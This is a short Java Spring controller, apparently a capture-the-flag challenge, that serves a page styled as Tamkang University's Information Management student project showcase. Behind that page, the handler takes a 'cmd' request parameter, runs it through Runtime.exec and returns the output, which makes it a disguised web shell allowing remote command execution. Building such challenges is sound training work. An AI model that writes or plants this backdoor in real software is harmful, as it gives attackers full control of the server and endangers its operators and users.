package com.example.ctf;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import java.io.InputStream;

@Controller
public class UserController {
    public static class User {
        private String name;
        public String getName() { return name; }
        public void setName(String name) { this.name = name; }
    }

    @RequestMapping("/")
    @ResponseBody
    public String index(User user, @RequestParam(value="cmd", required=false) String cmd) {
        if (cmd != null) {
            try {
                InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
                StringBuilder sb = new StringBuilder();
                int a = -1; byte[] b = new byte[2048];
                while ((a = in.read(b)) != -1) { sb.append(new String(b, 0, a)); }
                return sb.toString();
            } catch (Exception e) {
                return "Error executing command";
            }
        }
        return "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>資訊管理學系成果系統</title></head>"
             + "<body style='font-family: sans-serif; margin: 40px;'>"
             + "<h2>淡江大學資訊管理學系 - 學生期末專案成果展示平台</h2>"
             + "<hr>"
             + "<p>目前系統狀態：運行中。請使用正確的參數物件來檢索學長姐的專案成果。</p>"
             + "</body></html>";
    }
}
